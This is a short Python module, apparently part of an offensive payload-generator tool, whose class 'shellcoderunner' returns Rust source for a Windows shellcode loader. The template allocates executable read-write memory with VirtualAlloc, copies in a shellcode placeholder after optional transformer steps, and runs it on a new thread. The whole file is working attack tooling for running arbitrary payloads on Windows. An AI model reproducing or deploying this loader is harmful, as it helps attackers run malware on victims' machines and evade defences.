class shellcoderunner:

    def imports(self):
        return ['extern crate winapi;', 
                'use winapi::um::memoryapi::VirtualAlloc;', 
                'use winapi::um::processthreadsapi::CreateThread;', 
                'use winapi::um::synchapi::WaitForSingleObject;', 
                'use winapi::um::winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE};'
                'use std::ptr::null_mut;'
        ]

    def compilerOptions(self):
        return ['winapi = {version = "0.3.9", features = ["winnt", "synchapi", "memoryapi", "processthreadsapi"]}']

    def template(self):
        return """
{imports}

{codeblocks}

fn main() {{
    
    {shellcode}
    {transformers}
    unsafe {{
        let func_addr = VirtualAlloc(
            null_mut(),
            shellcode.len(),
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE, 
        );
		
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), func_addr as *mut u8, shellcode.len());

        let mut thread_id: u32 = 0; 
        let h_thread = CreateThread( 
            null_mut(), 
            0,
            Some(std::mem::transmute(func_addr)), 
            null_mut(),
            0,
            &mut thread_id as *mut u32, 
        );

        WaitForSingleObject(h_thread, 0xFFFFFFFF); 
    }}
}}
"""